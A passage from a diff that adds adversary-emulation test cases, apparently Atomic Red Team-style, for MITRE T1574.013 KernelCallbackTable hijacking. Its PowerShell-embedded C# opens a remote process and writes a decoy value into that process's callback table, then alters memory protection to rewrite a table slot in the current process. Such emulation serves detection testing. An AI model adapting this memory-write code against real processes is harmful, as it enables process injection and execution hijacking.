+        using System.Runtime.InteropServices;
+        public class KCTRemoteInject {
+            [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+            [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr handle);
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);
+            [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
+
+            public static void Inject(int pid) {
+                IntPtr hProcess = OpenProcess(0x0020 | 0x0010 | 0x0400, false, pid);
+                if (hProcess == IntPtr.Zero) return;
+
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                int status = NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                if (status == 0 && pbi.PebBaseAddress != IntPtr.Zero) {
+                    IntPtr tablePtrAddr = IntPtr.Add(pbi.PebBaseAddress, 0x58);
+                    byte[] tableBuf = new byte[Environment.Is64BitProcess ? 8 : 4];
+                    IntPtr readBytes;
+                    if (ReadProcessMemory(hProcess, tablePtrAddr, tableBuf, tableBuf.Length, out readBytes)) {
+                        IntPtr remoteTable = Environment.Is64BitProcess ? (IntPtr)BitConverter.ToInt64(tableBuf, 0) : (IntPtr)BitConverter.ToInt32(tableBuf, 0);
+                        if (remoteTable != IntPtr.Zero) {
+                            IntPtr slotAddr = IntPtr.Add(remoteTable, 2 * IntPtr.Size);
+                            byte[] decoyBuf = Environment.Is64BitProcess ? BitConverter.GetBytes((long)0x44444444) : BitConverter.GetBytes((int)0x44444444);
+                            IntPtr writtenBytes;
+                            WriteProcessMemory(hProcess, slotAddr, decoyBuf, decoyBuf.Length, out writtenBytes);
+                            Console.WriteLine("[+] Successfully simulated remote KernelCallbackTable slot write.");
+                        }
+                    }
+                }
+                CloseHandle(hProcess);
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTRemoteInject]::Inject($target.Id)
+        Stop-Process -Id $target.Id -Force
+      cleanup_command: |
+        Write-Host "[+] Remote notepad process terminated; target environment cleaned up."
+
+  - name: T1574.013 - Simulate Custom Payload Stub Address Mapping in Table
+    description: |
+      Simulates an adversary mapping a custom simulated payload address into the KernelCallbackTable array structure.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTPayloadMap {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 6 * IntPtr.Size);
+                IntPtr original = Marshal.ReadIntPtr(slotAddr);
+                Environment.SetEnvironmentVariable("T1574_ORIG_06", original.ToString("X"), EnvironmentVariableTarget.Process);
+
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, original);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Simulated payload mapping executed successfully.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTPayloadMap]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTPayloadClean {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string origHex) {
+                if (string.IsNullOrEmpty(origHex)) return;
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 6 * IntPtr.Size);
+                IntPtr orig = (IntPtr)Convert.ToInt64(origHex, 16);
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, orig);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Restored original payload mapping slot.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTPayloadClean]::Cleanup($env:T1574_ORIG_06)
